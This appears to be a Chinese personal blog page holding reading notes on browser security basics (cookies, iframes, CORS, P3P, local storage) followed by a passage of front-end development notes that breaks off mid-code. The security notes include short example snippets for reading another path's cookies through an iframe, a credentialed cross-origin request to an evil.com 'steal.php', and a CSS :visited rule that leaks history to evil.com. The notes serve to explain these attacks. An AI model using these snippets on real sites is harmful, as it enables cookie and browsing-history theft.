<p>HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？<br>这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发<br>送出去。Cookies 还可以包括登录认证后的身份信息。</p>
<p>Content-Type: text/html;charset=gbk<br>响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏<br>览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码<br>方式，同样可能带来安全问题。</p>
<p>Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030<br>00:00:00 GMT; path=/; domain=.foo.com<br>每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。<br>expires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。<br>path：相对路径，只有这个路径下的资源可以访问这个Cookie。<br>domain：域名，不允许设为下一级子域或其他外域，可以指定为父级域<br>HttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户<br>端脚本读取）。<br>Secure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着<br>Secure Cookie 能被盗取，可写意味着能被篡改。</p>
<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行</p>
<p>当网站页面使用iframe 方式嵌入一个页面时，<br>我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？<br>如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow<br>来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。<br>如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，<br>这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权<br>限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，</p>
<h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p> <a href="http://www.foo.com（来源域）的AJAX" target="_blank" rel="noopener">www.foo.com（来源域）的AJAX</a> 向<a href="http://www.evil.com（目标域）发起了请求，浏览器会" target="_blank" rel="noopener">www.evil.com（目标域）发起了请求，浏览器会</a><br>给自动带上Origin 头，如下：<br>Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：<br>Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>表示同意跨域</p>
<p>如果目标域不设置Access-Control-Allow-Origin: <a href="http://www.foo.com，那么隐私数据可" target="_blank" rel="noopener">http://www.foo.com，那么隐私数据可</a><br>以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被<br>目标域的steal.php 接收到了。</p>
<h3 id="跨域带上会话"><a href="#跨域带上会话" class="headerlink" title="跨域带上会话"></a>跨域带上会话</h3><p>默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：<br>&lt;?php<br>header(“Access-Control-Allow-Origin: <a href="http://www.foo.com&quot;)" target="_blank" rel="noopener">http://www.foo.com&quot;)</a>;<br>header(“Access-Control-Allow-Credentials: true”); // 允许跨域证书发送<br>//…<br>?&gt;<br>有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么<br>Access-Control-Allow-Origin 就不能设置为*通配符</p>
<h3 id="跨路径读取Cookie"><a href="#跨路径读取Cookie" class="headerlink" title="跨路径读取Cookie"></a>跨路径读取Cookie</h3><p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行<br>DOM 操作即可，/evil/路径下页面的代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xc = <span class="function"><span class="keyword">function</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>); <span class="comment">// iframe 进入同域的目标页面</span></span><br><span class="line">o.src = src;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(o);</span><br><span class="line">o.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// iframe 加载完成后</span></span><br><span class="line">d = o.contentDocument || o.contentWindow.document;</span><br><span class="line"><span class="comment">// 获取document 对象</span></span><br><span class="line">alert(d.cookie); <span class="comment">// 获取cookie</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;(<span class="string">'http://a.foo.com/admin/index.php'</span>);</span><br></pre></td></tr></table></figure></p>
<p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p>
<h3 id="本地Cookie-与内存Cookie"><a href="#本地Cookie-与内存Cookie" class="headerlink" title="本地Cookie 与内存Cookie"></a>本地Cookie 与内存Cookie</h3><p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了<br>过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，<br>待过期时间到了才会消失。</p>
<h3 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h3><p>HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项<br>隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标<br>网站而设置或发送，仅IE 执行了该策略。<br>比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。<br>加载的时候，有两种场景</p>
<ol>
<li><p>浏览器是否会允许foo 域设置自己的Cookie</p>
<p> 在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在<code>响应的时候带上P3P 字段</code></p>
</li>
<li><p>浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie</p>
<p> 发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果<br> 是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头<br> 也没用。</p>
<h3 id="IE的userData"><a href="#IE的userData" class="headerlink" title="IE的userData"></a>IE的userData</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">set_ud</span>(<span class="params">key,value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>); <span class="comment">// x 为任意div 的id 值</span></span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key,value);</span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.load(<span class="string">"db"</span>);</span><br><span class="line">    alert(a.getAttribute(key));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key, <span class="string">""</span>); <span class="comment">// 设置为空值即可</span></span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    set_ud(<span class="string">'a'</span>,<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>); <span class="comment">// 设置</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">    del_ud(<span class="string">'a'</span>); <span class="comment">// 删除a 的值</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="FlashCookie"><a href="#FlashCookie" class="headerlink" title="FlashCookie"></a>FlashCookie</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_lso</span><span class="params">(k:String=<span class="string">"default"</span>, v:String=<span class="string">""</span>)</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 设置值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.data[k] = v;</span><br><span class="line">    shared.flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_lso</span><span class="params">(k:String=<span class="string">"default"</span>)</span>:String</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 获取值</span></span><br><span class="line">    <span class="keyword">var</span> str:String = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    str = shared.data[k];</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear_lso</span><span class="params">()</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 清空值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="函数劫持很简单"><a href="#函数劫持很简单" class="headerlink" title="函数劫持很简单"></a>函数劫持很简单</h3><p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p>
<h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=a2);&#125;</span><br></pre></td></tr></table></figure>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/读书笔记/">读书笔记</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/6/suibi.html" title="2018-6总结" itemprop="url">2018-6总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-05-31T16:00:00.000Z" itemprop="datePublished"> Published 2018-06-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="await-async最佳实践"><a href="#await-async最佳实践" class="headerlink" title="await/async最佳实践"></a>await/async最佳实践</h3><h4 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> pizzaPromise = selectPizza();<span class="comment">//同时执行</span></span><br><span class="line">    <span class="keyword">const</span> drinkPromise = selectDrink();<span class="comment">//同时执行</span></span><br><span class="line">    <span class="keyword">await</span> pizzaPromise;</span><br><span class="line">    <span class="keyword">await</span> drinkPromise;</span><br><span class="line">    orderItems();</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">Promise</span>.all([selectPizza(),selectDrink()]).then()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h4 id="第二个例子"><a href="#第二个例子" class="headerlink" title="第二个例子"></a>第二个例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    b();</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">c((=&gt;&#123;</span><br><span class="line">    d();</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure>
<p>改写为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">await</span> a();</span><br><span class="line">    b();</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">await</span> c();</span><br><span class="line">    d();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">ab</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">await</span> a();</span><br><span class="line">    b();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">cd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">await</span> c();</span><br><span class="line">    d();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.all([ab(),cd()]);</span><br></pre></td></tr></table></figure></p>
<h3 id="使用keep-alive"><a href="#使用keep-alive" class="headerlink" title="使用keep-alive"></a>使用keep-alive</h3><p>在商品列表进入商品详情页之后<br><a href="https://www.cnblogs.com/nokelong/p/8124513.html" target="_blank" rel="noopener">vue中使用keepAlive组件缓存遇到的坑</a></p>
<h3 id="for循环、while循环、do-while循环比for-in-要快"><a href="#for循环、while循环、do-while循环比for-in-要快" class="headerlink" title="for循环、while循环、do-while循环比for in 要快"></a>for循环、while循环、do-while循环比for in 要快</h3><h3 id="字符串-拼接性能"><a href="#字符串-拼接性能" class="headerlink" title="字符串 拼接性能"></a>字符串 拼接性能</h3><p>比较下四中字符串拼接方法的性能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A：str = str + &apos;a&apos;+&apos;b&apos;</span><br><span class="line">B:str += &apos;a&apos; + &apos;b&apos;</span><br><span class="line">C: arr.join(&apos;&apos;)</span><br><span class="line">D:str.concat(&apos;b&apos;,&apos;c&apos;)</span><br></pre></td></tr></table></figure></p>
<p>☆ Chrome65上测试的是A优于B优于C优于D</p>
<h3 id="总结一些常用的"><a href="#总结一些常用的" class="headerlink" title="总结一些常用的"></a>总结一些常用的</h3><ol>
<li>内容长短不固定的时候用min-height,而不要用height</li>
<li><p>显示一行，多余的用省略号表示</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.one-line</span>&#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line">```     </span><br><span class="line">最多显示2行，多余的用省略号表示</span><br><span class="line">```<span class="selector-tag">css</span></span><br><span class="line"><span class="selector-class">.two-line</span>&#123;     </span><br><span class="line">    <span class="attribute">overflow</span>: hidden;     </span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一般英文或者数字是默认不换行，所以要加上</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">word-break</span>: <span class="selector-tag">break-all</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>placeholder</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:-moz-placeholder</span> &#123; <span class="comment">/* Mozilla Firefox 4 to 18 */</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-pseudo">::-moz-placeholder</span> &#123; <span class="comment">/* Mozilla Firefox 19+ */</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:-ms-input-placeholder</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">::-webkit-input-placeholder</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="a标签里面不加download属性会下载下来一些莫名其妙的东西"><a href="#a标签里面不加download属性会下载下来一些莫名其妙的东西" class="headerlink" title="a标签里面不加download属性会下载下来一些莫名其妙的东西"></a>a标签里面不加download属性会下载下来一些莫名其妙的东西</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">"file.worksheetFileId|url"</span>  <span class="attr">:download</span>=<span class="string">"file.fileName"</span>&gt;</span>&#123;&#123;file.fileName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>html5对a标签新增的download属性用于下载文件，简单的理解是a标签如果添加了download属性，那么点击它的时候就不会跳转，而是会触发浏览器下载文件。<br>那么我不加download属性会下载下来的东西是什么？？</p>
<p>答案：docx后缀的word文档用解压软件打开就是这个目录结构</p>
<h3 id="nextTick"><a href="#nextTick" class="headerlink" title="$nextTick"></a>$nextTick</h3><p>Vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是按一定的策略进行 DOM 的更新。<br>$nextTick 是在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后使用 。</p>
<h3 id="router-link存在的问题是，手动输入改变url，下面路由没监听到"><a href="#router-link存在的问题是，手动输入改变url，下面路由没监听到" class="headerlink" title="router-link存在的问题是，手动输入改变url，下面路由没监听到"></a>router-link存在的问题是，手动输入改变url，下面路由没监听到</h3><p> vue-router在IE 11下有bug,a href 里的路径，点击地址栏发生了变化，页面并不跳转<br>vm._route.path并没有发生变化，和地址栏不同步<br>要加上这段代码修正下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fixRouterIE</span>(<span class="params">vm</span>)</span>&#123;</span><br><span class="line">	<span class="comment">//IE 11下</span></span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line">	  <span class="string">'-ms-scroll-limit'</span> <span class="keyword">in</span> <span class="built_in">document</span>.documentElement.style &amp;&amp; </span><br><span class="line">	  <span class="string">'-ms-ime-align'</span> <span class="keyword">in</span> <span class="built_in">document</span>.documentElement.style</span><br><span class="line">	) &#123; </span><br><span class="line">	  <span class="built_in">window</span>.addEventListener(<span class="string">"hashchange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">	    <span class="keyword">const</span> currentPath = <span class="built_in">window</span>.location.hash.slice(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (vm._route.path !== currentPath) &#123;</span><br><span class="line">	      vm._router.push(currentPath)</span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;, <span class="literal">false</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Array-prototype-sort-兼容"><a href="#Array-prototype-sort-兼容" class="headerlink" title="Array.prototype.sort 兼容"></a>Array.prototype.sort 兼容</h3><p>IE9– Array.prototype.sort 不能根据 对象属性 做排序的遗憾<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法1冒泡排序</span></span><br><span class="line"><span class="keyword">var</span> mySort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fn != <span class="string">'function'</span>)&#123;</span><br><span class="line">        fn = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="keyword">this</span>.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=i+<span class="number">1</span>;j&lt;<span class="keyword">this</span>.length;j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">this</span>[i];</span><br><span class="line">            <span class="keyword">if</span>(fn(<span class="keyword">this</span>[i],<span class="keyword">this</span>[j]) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">this</span>[i] = <span class="keyword">this</span>[j];</span><br><span class="line">                <span class="keyword">this</span>[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.prototype.sorts!= <span class="string">'fucntion'</span>)&#123;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.sorts = mySort;</span><br><span class="line">    mySort = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法2 插入排序</span></span><br><span class="line"><span class="keyword">var</span> mySort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fn != <span class="string">'function'</span>)&#123;</span><br><span class="line">        fn = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="keyword">this</span>.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="keyword">this</span>[i];</span><br><span class="line">        <span class="keyword">var</span> j = i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; fn(<span class="keyword">this</span>[j],t)&gt; <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">this</span>[j+<span class="number">1</span>] = <span class="keyword">this</span>[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>[j+<span class="number">1</span>] = t;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.prototype.sorts!= <span class="string">'fucntion'</span>)&#123;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.sorts = mySort;</span><br><span class="line">    mySort = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>safari 不支持函数参数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">window</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> ua = <span 